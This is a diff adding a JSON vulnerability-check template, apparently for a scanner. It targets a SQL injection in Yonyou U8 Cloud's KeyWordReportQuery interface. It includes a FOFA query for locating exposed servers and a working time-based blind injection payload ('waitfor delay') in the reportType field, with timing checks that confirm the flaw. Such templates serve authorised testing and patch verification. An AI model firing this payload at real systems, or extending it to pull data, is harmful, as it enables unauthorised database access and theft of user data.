@@ -1,0 +1,64 @@
+{
+  "product": "用友U8 Cloud",
+  "vul_name": "用友U8 Cloud KeyWordReportQuery存在SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友U8 Cloud KeyWordReportQuery接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。",
+  "version": "U8 cloud 2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"用友-U8-Cloud\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_41904294/article/details/136328898",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery",
+        "data": "{\"reportType\":\"1';waitfor delay '0:0:8'-- \",\"pageInfo\":{\"currentPageIndex\":1,\"pageSize\":1},\"keyword\":[]}"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery",
+        "data": "{\"reportType\":\"1';waitfor delay '0:0:0'-- \",\"pageInfo\":{\"currentPageIndex\":1,\"pageSize\":1},\"keyword\":[]}"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
